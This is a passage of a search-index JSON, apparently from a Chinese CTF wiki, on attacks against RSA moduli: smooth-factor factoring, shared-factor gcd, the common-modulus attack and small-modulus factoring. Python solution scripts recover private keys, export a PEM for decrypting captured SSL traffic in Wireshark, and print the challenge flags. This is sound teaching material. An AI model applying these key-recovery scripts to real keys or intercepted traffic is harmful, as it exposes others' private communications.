\u6bd4\u7279\u3002\u800c\u4e14\uff0c\u6839\u636e\u9898\u76ee\u540d very smooth\uff0c\u5e94\u8be5\u662f\u5176\u4e2d\u4e00\u4e2a\u56e0\u5b50\u6bd4\u8f83 smooth\uff0c\u8fd9\u91cc\u6211\u4eec\u5229\u7528 primefac \u5206\u522b\u5c1d\u8bd5 Pollard's p \u2212 1 \u4e0e Williams's p + 1 \u7b97\u6cd5\uff0c\u5982\u4e0b\n\n\n\u279c  _s.pcap.extracted git:\n(\nmaster\n)\n python -m primefac -vs -m\n=\np+1  \n149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897\n\n\n\n149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897\n: p+1 \n11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001\n \n12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897\n\n\nZ309\n  \n=\n  P155 x \nP155\n  \n=\n  \n11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001\n x \n12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897\n\n\n\n\n\n\u53ef\u4ee5\u53d1\u73b0\u5f53\u4f7f\u7528 Williams's \np\n + 1 \u7b97\u6cd5\u65f6\uff0c\u5c31\u76f4\u63a5\u5206\u89e3\u51fa\u6765\u4e86\u3002\u6309\u9053\u7406\u8fd9\u4e2a\u56e0\u5b50\u662f p-1 \u4f3c\u4e4e\u66f4\u5149\u6ed1\uff0c\u4f46\u662f\u5374\u5e76\u4e0d\u80fd\u4f7f\u7528 Pollard's p \u2212 1 \u7b97\u6cd5\u5206\u89e3\uff0c\u8fd9\u91cc\u8fdb\u884c\u8fdb\u4e00\u6b65\u7684\u6d4b\u8bd5\n\n\n\u279c  _s.pcap.extracted git:\n(\nmaster\n)\n python -m primefac -vs \n1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002\n\n\n\n1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002\n: \n2\n \n7\n \n43\n \n503\n \n761429\n \n5121103123294685745276806480148867612214394022184063853387799606010231770631857868979139305712805242051823263337587909550709296150544706624823\n\n\nZ154\n  \n=\n  P1 x P1 x P2 x P3 x P6 x \nP142\n  \n=\n  \n2\n x \n7\n x \n43\n x \n503\n x \n761429\n x \n5121103123294685745276806480148867612214394022184063853387799606010231770631857868979139305712805242051823263337587909550709296150544706624823\n\n\n\u279c  _s.pcap.extracted git:\n(\nmaster\n)\n python -m primefac -vs \n1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n \n\n\n1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n: \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n2\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n3\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n \n5\n\n\nZ154\n  \n=\n  P1^185 x P1^62 x P1^97  \n=\n  \n2\n^185 x \n3\n^62 x \n5\n^97\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u5bf9\u4e8e p-1 \u786e\u5b9e\u6709\u5f88\u591a\u5c0f\u56e0\u5b50\uff0c\u4f46\u662f\u4e2a\u6570\u592a\u591a\uff0c\u8fd9\u5c31\u4f1a\u4f7f\u5f97\u8fdb\u884c\u679a\u4e3e\u7684\u65f6\u5019\u51fa\u73b0\u6307\u6570\u7206\u70b8\u7684\u60c5\u51b5\uff0c\u56e0\u6b64\u6ca1\u6709\u5206\u89e3\u51fa\u6765\u3002\n\n\n\u8fdb\u800c\u6839\u636e\u5206\u89e3\u51fa\u6765\u7684\u6570\u6784\u9020\u79c1\u94a5\n\n\nfrom\n \nCrypto.PublicKey\n \nimport\n \nRSA\n\n\nimport\n \ngmpy2\n\n\n\n\ndef\n \nmain\n():\n\n    \nn\n \n=\n \n149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897L\n\n    \np\n \n=\n \n11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001L\n\n    \nq\n \n=\n \n12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897L\n\n    \ne\n \n=\n \n65537L\n\n    \npriv\n \n=\n \nRSA\n.\nconstruct\n((\nn\n,\n \ne\n,\n \nlong\n(\ngmpy2\n.\ninvert\n(\ne\n,\n \n(\np\n \n-\n \n1\n)\n \n*\n \n(\nq\n \n-\n \n1\n)))))\n\n    \nopen\n(\nprivate.pem\n,\n \nw\n)\n.\nwrite\n(\npriv\n.\nexportKey\n(\nPEM\n))\n\n\n\n\nmain\n()\n\n\n\n\n\n\u6700\u540e\uff0c\u5c06\u79c1\u94a5\u5bfc\u5165\u5230 wireshark \u4e2d\u5373\u53ef\u5f97\u5230\u660e\u6587\uff08Edit -\n Preferences -\n Protocols -\n SSL -\n RSA Key List\uff09\u3002\n\n\nhtml\n\n\nhead\ntitle\nVery smooth\n/\ntitle\n/\nhead\n\n\nbody\n\n\nh1\n\nAnswer: One of these primes is very smooth.\n\n/\nh1\n\n\n/\nbody\n\n\n/\nhtml\n\n\n\n\n\n\u6269\u5c55\n\n\n\u5173\u4e8e\u66f4\u591a\u7684\u4e00\u4e9b\u5206\u89e3\u6a21\u6570 N \u7684\u65b9\u6cd5\u53ef\u4ee5\u53c2\u8003 \nhttps://en.wikipedia.org/wiki/Integer_factorization\n\u3002\n\n\n\u6a21\u4e0d\u4e92\u7d20\n\n\n\u653b\u51fb\u539f\u7406\n\n\n\u5f53\u5b58\u5728\u4e24\u4e2a\u516c\u94a5\u7684 N \u4e0d\u4e92\u7d20\u65f6\uff0c\u6211\u4eec\u663e\u7136\u53ef\u4ee5\u76f4\u63a5\u5bf9\u8fd9\u4e24\u4e2a\u6570\u6c42\u6700\u5927\u516c\u56e0\u6570\uff0c\u7136\u540e\u76f4\u63a5\u83b7\u5f97 p\uff0cq\uff0c\u8fdb\u800c\u83b7\u5f97\u76f8\u5e94\u7684\u79c1\u94a5\u3002\n\n\nSCTF RSA2\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5 SCTF rsa2 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u76f4\u63a5\u6253\u5f00 pcap \u5305\uff0c\u53d1\u73b0\u6709\u4e00\u5806\u7684\u6d88\u606f\uff0c\u5305\u542b N \u548c e\uff0c\u7136\u540e\u8bd5\u4e86\u8bd5\u4e0d\u540c\u7684 N \u662f\u5426\u4e92\u7d20\uff0c\u6211\u8bd5\u4e86\u524d\u4e24\u4e2a\n\n\nimport\n \ngmpy2\n\n\nn1\n \n=\n \n20823369114556260762913588844471869725762985812215987993867783630051420241057912385055482788016327978468318067078233844052599750813155644341123314882762057524098732961382833215291266591824632392867716174967906544356144072051132659339140155889569810885013851467056048003672165059640408394953573072431523556848077958005971533618912219793914524077919058591586451716113637770245067687598931071827344740936982776112986104051191922613616045102859044234789636058568396611030966639561922036712001911238552391625658741659644888069244729729297927279384318252191421446283531524990762609975988147922688946591302181753813360518031\n\n\nn2\n \n=\n \n19083821613736429958432024980074405375408953269276839696319265596855426189256865650651460460079819368923576109723079906759410116999053050999183058013281152153221170931725172009360565530214701693693990313074253430870625982998637645030077199119183041314493288940590060575521928665131467548955951797198132001987298869492894105525970519287000775477095816742582753228905458466705932162641076343490086247969277673809512472546919489077884464190676638450684714880196854445469562733561723325588433285405495368807600668761929378526978417102735864613562148766250350460118131749533517869691858933617013731291337496943174343464943\n\n\nprint\n \ngmpy2\n.\ngcd\n(\nn1\n,\n \nn2\n)\n\n\n\n\n\n\u7ed3\u679c\u53d1\u73b0\u7adf\u7136\u4e0d\u4e92\u7d20\u3002\n\n\n\u279c  scaf-rsa2 git:\n(\nmaster\n)\n \u2717 python exp.py\n\n122281872221091773923842091258531471948886120336284482555605167683829690073110898673260712865021244633908982705290201598907538975692920305239961645109897081011524485706755794882283892011824006117276162119331970728229108731696164377808170099285659797066904706924125871571157672409051718751812724929680249712137\n\n\n\n\n\n\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u6765\u89e3\u5bc6\u4e86\uff0c\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u7b2c\u4e00\u5bf9\u516c\u94a5\u5bc6\u7801\u3002\u4ee3\u7801\u5982\u4e0b\n\n\nfrom\n \nCrypto.PublicKey\n \nimport\n \nRSA\n\n\nfrom\n \nCrypto.Cipher\n \nimport\n \nPKCS1_v1_5\n,\n \nPKCS1_OAEP\n\n\nimport\n \ngmpy2\n\n\nfrom\n \nbase64\n \nimport\n \nb64decode\n\n\nn1\n \n=\n \n20823369114556260762913588844471869725762985812215987993867783630051420241057912385055482788016327978468318067078233844052599750813155644341123314882762057524098732961382833215291266591824632392867716174967906544356144072051132659339140155889569810885013851467056048003672165059640408394953573072431523556848077958005971533618912219793914524077919058591586451716113637770245067687598931071827344740936982776112986104051191922613616045102859044234789636058568396611030966639561922036712001911238552391625658741659644888069244729729297927279384318252191421446283531524990762609975988147922688946591302181753813360518031\n\n\nn2\n \n=\n \n19083821613736429958432024980074405375408953269276839696319265596855426189256865650651460460079819368923576109723079906759410116999053050999183058013281152153221170931725172009360565530214701693693990313074253430870625982998637645030077199119183041314493288940590060575521928665131467548955951797198132001987298869492894105525970519287000775477095816742582753228905458466705932162641076343490086247969277673809512472546919489077884464190676638450684714880196854445469562733561723325588433285405495368807600668761929378526978417102735864613562148766250350460118131749533517869691858933617013731291337496943174343464943\n\n\np1\n \n=\n \ngmpy2\n.\ngcd\n(\nn1\n,\n \nn2\n)\n\n\nq1\n \n=\n \nn1\n \n/\n \np1\n\n\ne\n \n=\n \n65537\n\n\nphin\n \n=\n \n(\np1\n \n-\n \n1\n)\n \n*\n \n(\nq1\n \n-\n \n1\n)\n\n\nd\n \n=\n \ngmpy2\n.\ninvert\n(\ne\n,\n \nphin\n)\n\n\ncipher\n \n=\n \n0x68d5702b70d18238f9d4a3ac355b2a8934328250efd4efda39a4d750d80818e6fe228ba3af471b27cc529a4b0bef70a2598b80dd251b15952e6a6849d366633ed7bb716ed63c6febd4cd0621b0c4ebfe5235de03d4ee016448de1afbbe61144845b580eed8be8127a8d92b37f9ef670b3cdd5af613c76f58ca1a9f6f03f1bc11addba30b61bb191efe0015e971b8f78375faa257a60b355050f6435d94b49eab07075f40cb20bb8723d02f5998d5538e8dafc80cc58643c91f6c0868a7a7bf3bf6a9b4b6e79e0a80e89d430f0c049e1db4883c50db066a709b89d74038c34764aac286c36907b392bc299ab8288f9d7e372868954a92cdbf634678f7294096c7\n\n\nplain\n \n=\n \ngmpy2\n.\npowmod\n(\ncipher\n,\n \nd\n,\n \nn1\n)\n\n\nplain\n \n=\n \nhex\n(\nplain\n)[\n2\n:]\n\n\nif\n \nlen\n(\nplain\n)\n \n%\n \n2\n \n!=\n \n0\n:\n\n    \nplain\n \n=\n \n0\n \n+\n \nplain\n\n\nprint\n \nplain\n.\ndecode\n(\nhex\n)\n\n\n\n\n\n\u6700\u540e\u89e3\u5bc6\u5982\u4e0b\n\n\n\u279c  scaf-rsa2 git:\n(\nmaster\n)\n \u2717 python exp.py       \nsH1R3_PRlME_1N_rsA_iS_4ulnEra5le\n\n\n\n\n\u89e3\u538b\u538b\u7f29\u5305\u5373\u53ef\u3002\n\n\n\u5171\u6a21\u653b\u51fb\n\n\n\u653b\u51fb\u6761\u4ef6\n\n\n\u5f53\u4e24\u4e2a\u7528\u6237\u4f7f\u7528\u76f8\u540c\u7684\u6a21\u6570 N\u3001\u4e0d\u540c\u7684\u79c1\u94a5\u65f6\uff0c\u52a0\u5bc6\u540c\u4e00\u660e\u6587\u6d88\u606f\u65f6\u5373\u5b58\u5728\u5171\u6a21\u653b\u51fb\u3002\n\n\n\u653b\u51fb\u539f\u7406\n\n\n\u8bbe\u4e24\u4e2a\u7528\u6237\u7684\u516c\u94a5\u5206\u522b\u4e3a \ne_1\ne_1\n \u548c \ne_2\ne_2\n\uff0c\u4e14\u4e24\u8005\u4e92\u8d28\u3002\u660e\u6587\u6d88\u606f\u4e3a \nm\nm\n\uff0c\u5bc6\u6587\u5206\u522b\u4e3a\uff1a\n\n\n\n\n\nc_1 = m^{e_1}\\bmod N \\\\\nc_2 = m^{e_2}\\bmod N\n\n\n\n\nc_1 = m^{e_1}\\bmod N \\\\\nc_2 = m^{e_2}\\bmod N\n\n\n\n\n\n\u5f53\u653b\u51fb\u8005\u622a\u83b7 \nc_1\nc_1\n \u548c \nc_2\nc_2\n \u540e\uff0c\u5c31\u53ef\u4ee5\u6062\u590d\u51fa\u660e\u6587\u3002\u7528\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\u6c42\u51fa \nre_1+se_2=1\\bmod n\nre_1+se_2=1\\bmod n\n \u7684\u4e24\u4e2a\u6574\u6570 \nr\nr\n \u548c \ns\ns\n\uff0c\u7531\u6b64\u53ef\u5f97\uff1a\n\n\n\n\n\n\\begin{align*}\nc_{1}^{r}c_{2}^{s} \n\\equiv m^{re_1}m^{se_2}\\bmod n\\\\\n\n\\equiv m^{(re_1+se_2)} \\bmod n\\\\\n\n\\equiv m\\bmod n\n\\end{align*}\n\n\n\n\n\\begin{align*}\nc_{1}^{r}c_{2}^{s} &\\equiv m^{re_1}m^{se_2}\\bmod n\\\\\n&\\equiv m^{(re_1+se_2)} \\bmod n\\\\\n&\\equiv m\\bmod n\n\\end{align*}\n\n\n\n\n\nXMan \u4e00\u671f\u590f\u4ee4\u8425\u8bfe\u5802\u7ec3\u4e60\n\n\n\u9898\u76ee\u63cf\u8ff0\uff1a\n\n\n{6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,773}\n\n{6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,839}\n\nmessage1=3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349\n\nmessage2=5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535\n\n\n\n\n\n\n\u9898\u76ee\u6765\u6e90\uff1aXMan \u4e00\u671f\u590f\u4ee4\u8425\u8bfe\u5802\u7ec3\u4e60 \n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u4e24\u4e2a\u516c\u94a5\u7684 N \u662f\u4e00\u6837\u7684\uff0c\u5e76\u4e14\u4e24\u8005\u7684 e \u4e92\u7d20\u3002\u5199\u4e00\u4e2a\u811a\u672c\u8dd1\u4e00\u4e0b\uff1a\n\n\nimport\n \ngmpy2\n\n\nn\n \n=\n \n6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249\n\n\ne1\n \n=\n \n773\n\n\n\ne2\n \n=\n \n839\n\n\n\nmessage1\n \n=\n \n3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349\n\n\n\nmessage2\n \n=\n \n5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535\n\n\n# s \n t\n\n\ngcd\n,\n \ns\n,\n \nt\n \n=\n \ngmpy2\n.\ngcdext\n(\ne1\n,\n \ne2\n)\n\n\nif\n \ns\n \n \n0\n:\n\n    \ns\n \n=\n \n-\ns\n\n    \nmessage1\n \n=\n \ngmpy2\n.\ninvert\n(\nmessage1\n,\n \nn\n)\n\n\nif\n \nt\n \n \n0\n:\n\n    \nt\n \n=\n \n-\nt\n\n    \nmessage2\n \n=\n \ngmpy2\n.\ninvert\n(\nmessage2\n,\n \nn\n)\n\n\nplain\n \n=\n \ngmpy2\n.\npowmod\n(\nmessage1\n,\n \ns\n,\n \nn\n)\n \n*\n \ngmpy2\n.\npowmod\n(\nmessage2\n,\n \nt\n,\n \nn\n)\n \n%\n \nn\n\n\nprint\n \nplain\n\n\n\n\n\n\u5f97\u5230\n\n\n\u279c  Xman-1-class-exercise git:\n(\nmaster\n)\n \u2717 python exp.py\n\n1021089710312311910410111011910111610410511010710511610511511211111511510598108101125\n\n\n\n\n\n\u8fd9\u65f6\u5019\u9700\u8981\u8003\u8651\u5f53\u65f6\u660e\u6587\u662f\u5982\u4f55\u8f6c\u5316\u4e3a\u8fd9\u4e2a\u6570\u5b57\u4e86\uff0c\u4e00\u822c\u6765\u8bf4\u662f 16 \u8fdb\u5236\u8f6c\u6362\uff0cASCII \u5b57\u7b26\u8f6c\u6362\uff0c\u6216\u8005 Base64 \u89e3\u5bc6\u3002\u8fd9\u4e2a\u5e94\u8be5\u662f ASCII \u5b57\u7b26\u8f6c\u6362\uff0c\u8fdb\u800c\u6211\u4eec\u4f7f\u7528\u5982\u4e0b\u4ee3\u7801\u5f97\u5230 flag\n\n\ni\n \n=\n \n0\n\n\nflag\n \n=\n \n\n\nplain\n \n=\n \nstr\n(\nplain\n)\n\n\nwhile\n \ni\n \n \nlen\n(\nplain\n):\n\n    \nif\n \nplain\n[\ni\n]\n \n==\n \n1\n:\n\n        \nflag\n \n+=\n \nchr\n(\nint\n(\nplain\n[\ni\n:\ni\n \n+\n \n3\n]))\n\n        \ni\n \n+=\n \n3\n\n    \nelse\n:\n\n        \nflag\n \n+=\n \nchr\n(\nint\n(\nplain\n[\ni\n:\ni\n \n+\n \n2\n]))\n\n        \ni\n \n+=\n \n2\n\n\nprint\n \nflag\n\n\n\n\n\n\u8fd9\u91cc\u4e4b\u6240\u4ee5\u4f7f\u7528 1 \u6765\u5224\u65ad\u662f\u5426\u4e3a\u4e09\u4f4d\u957f\u5ea6\uff0c\u662f\u56e0\u4e3a flag \u4e00\u822c\u90fd\u662f\u660e\u6587\u5b57\u7b26\uff0c\u800c 1 \u5f00\u5934\u7684\u957f\u5ea6\u4e3a 1 \u6216\u8005 2 \u7684\u6570\u5b57\uff0c\u4e00\u822c\u90fd\u662f\u4e0d\u53ef\u89c1\u5b57\u7b26\u3002\n\n\nflag\n\n\n\u279c  Xman-1-class-exercise git:\n(\nmaster\n)\n \u2717 python exp.py\nflag\n{\nwhenwethinkitispossible\n}\n\n\n\n\n\n\u9898\u76ee\n\n\n\n\nJarvis OJ very hard RSA", 
            "title": "\u6a21\u6570\u76f8\u5173\u653b\u51fb"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_module_attack/#n", 
            "text": "", 
            "title": "\u66b4\u529b\u5206\u89e3 N"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_module_attack/#_1", 
            "text": "\u5728 N \u7684\u6bd4\u7279\u4f4d\u6570\u5c0f\u4e8e 512 \u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u91c7\u7528\u5927\u6574\u6570\u5206\u89e3\u7684\u7b56\u7565\u83b7\u53d6 p \u548c q\u3002", 
            "title": "\u653b\u51fb\u6761\u4ef6"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_module_attack/#jarvisoj-medium-rsa", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5 JarvisOJ - Medium RSA \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9898\u76ee\u5982\u4e0b   \u8fd8\u8bb0\u5f97 veryeasy RSA \u5417\uff1f\u662f\u4e0d\u662f\u4e0d\u96be\uff1f\u90a3\u7ee7\u7eed\u6765\u770b\u770b\u8fd9\u9898\u5427\uff0c\u8fd9\u9898\u4e5f\u4e0d\u96be\u3002 \n\u5df2\u77e5\u4e00\u6bb5 RSA \u52a0\u5bc6\u7684\u4fe1\u606f\u4e3a\uff1a0xdc2eeeb2782c \u4e14\u5df2\u77e5\u52a0\u5bc6\u6240\u7528\u7684\u516c\u94a5\uff1a \nN=322831561921859 e = 23 \n\u8bf7\u89e3\u5bc6\u51fa\u660e\u6587\uff0c\u63d0\u4ea4\u65f6\u8bf7\u5c06\u6570\u5b57\u8f6c\u5316\u4e3a ascii \u7801\u63d0\u4ea4 \n\u6bd4\u5982\u4f60\u89e3\u51fa\u7684\u660e\u6587\u662f 0x6162\uff0c\u90a3\u4e48\u8bf7\u63d0\u4ea4\u5b57\u7b26\u4e32 ab \n\u63d0\u4ea4\u683c\u5f0f\uff1a PCTF{\u660e\u6587\u5b57\u7b26\u4e32}   \u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u7684 N \u6bd4\u8f83\u5c0f\uff0c\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 factordb \u8fdb\u884c\u5206\u89e3\uff0c\u53ef\u4ee5\u5f97\u5230   \n322831561921859 = 13574881 \\times 23781539  \n322831561921859 = 13574881 \\times 23781539   \u8fdb\u800c\u6211\u4eec\u7b80\u5355\u7f16\u5199\u7a0b\u5e8f\u5982\u4e0b  import   gmpy2  p   =   13574881  q   =   23781539  n   =   p   *   q  e   =   23  c   =   0xdc2eeeb2782c  phin   =   ( p   -   1 )   *   ( q   -   1 )  d   =   gmpy2 . invert ( e ,   phin )  p   =   gmpy2 . powmod ( c ,   d ,   n )  tmp   =   hex ( p )  print   tmp ,   tmp [ 2 :] . decode ( hex )   \u7ed3\u679c\u5982\u4e0b  \u279c  Jarvis OJ-Basic-easyRSA git: ( master )  \u2717 python exp.py\n0x33613559 3a5Y", 
            "title": "JarvisOJ - Medium RSA"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_module_attack/#p-q-n", 
            "text": "", 
            "title": "p &amp; q \u4e0d\u5f53\u5206\u89e3 N"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_module_attack/#_2", 
            "text": "\u5f53 RSA \u4e2d p \u548c q \u9009\u53d6\u4e0d\u5f53\u65f6\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u8fdb\u884c\u653b\u51fb\u3002", 
            "title": "\u653b\u51fb\u6761\u4ef6"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_module_attack/#p-q", 
            "text": "\u5f53 p-q \u5f88\u5927\u65f6\uff0c\u4e00\u5b9a\u5b58\u5728\u67d0\u4e00\u4e2a\u53c2\u6570\u8f83\u5c0f\uff0c\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u4e3a p\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7a77\u4e3e\u7684\u65b9\u6cd5\u5bf9\u6a21\u6570\u8fdb\u884c\u8bd5\u9664\uff0c\u4ece\u800c\u5206\u89e3\u6a21\u6570\uff0c\u5f97\u5230\u4fdd\u5bc6\u53c2\u6570\u4e0e\u660e\u6587\u4fe1\u606f\u3002\u57fa\u672c\u6765\u8bf4\uff0c\u4e0d\u600e\u4e48\u53ef\u884c\u3002", 
            "title": "|p-q| \u5f88\u5927"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_module_attack/#p-q_1", 
            "text": "\u9996\u5148   \n\\frac{(p+q)^2}{4}-n=\\frac{(p+q)^2}{4}-pq=\\frac{(p-q)^2}{4}  \n\\frac{(p+q)^2}{4}-n=\\frac{(p+q)^2}{4}-pq=\\frac{(p-q)^2}{4}   \u65e2\u7136 |p-q| \u8f83\u5c0f\uff0c\u90a3\u4e48  \\frac{(p-q)^2}{4} \\frac{(p-q)^2}{4}  \u81ea\u7136\u4e5f\u6bd4\u8f83\u5c0f\uff0c\u8fdb\u800c  \\frac{(p+q)^2}{4} \\frac{(p+q)^2}{4}  \u53ea\u662f\u6bd4 N \u7a0d\u5fae\u5927\u4e00\u70b9\uff0c\u6240\u4ee5  \\frac{p+q}{2} \\frac{p+q}{2}  \u4e0e  \\sqrt{n} \\sqrt{n}  \u76f8\u8fd1\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6309\u7167\u5982\u4e0b\u65b9\u6cd5\u6765\u5206\u89e3   \u987a\u5e8f\u68c0\u67e5  \\sqrt{n} \\sqrt{n}  \u7684\u6bcf\u4e00\u4e2a\u6574\u6570 x\uff0c\u76f4\u5230\u627e\u5230\u4e00\u4e2a x \u4f7f\u5f97  x^2-n x^2-n  \u662f\u5e73\u65b9\u6570\uff0c\u8bb0\u4e3a  y^2 y^2  \u90a3\u4e48  x^2-n=y^2 x^2-n=y^2 \uff0c\u8fdb\u800c\u6839\u636e\u5e73\u65b9\u5dee\u516c\u5f0f\u5373\u53ef\u5206\u89e3 N", 
            "title": "|p-q| \u8f83\u5c0f"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_module_attack/#p-1", 
            "text": "\u5f53 p \u662f N \u7684\u56e0\u6570\uff0c\u5e76\u4e14 p - 1 \u662f\u5149\u6ed1\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u53ef\u4ee5\u4f7f\u7528 Pollard's p \u2212 1 \u7b97\u6cd5\u6765\u5206\u89e3 N\uff0c\u4f46\u662f\u4e5f\u4e0d\u662f\u5b8c\u5168\u53ef\u4ee5\u6210\u529f\u7684\u3002   Warning  \u539f\u7406\u5206\u6790\u5f85\u5b8c\u6210", 
            "title": "p - 1 \u5149\u6ed1"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_module_attack/#p-1_1", 
            "text": "\u5f53 p \u662f n \u7684\u56e0\u6570\uff0c\u5e76\u4e14 p + 1 \u662f\u5149\u6ed1\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u53ef\u4ee5\u4f7f\u7528 Williams's p + 1 \u7b97\u6cd5\u6765\u5206\u89e3 N\uff0c\u4f46\u662f\u4e5f\u4e0d\u662f\u5b8c\u5168\u53ef\u4ee5\u6210\u529f\u7684\u3002", 
            "title": "p + 1 \u5149\u6ed1"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_module_attack/#2017-seccon-very-smooth", 
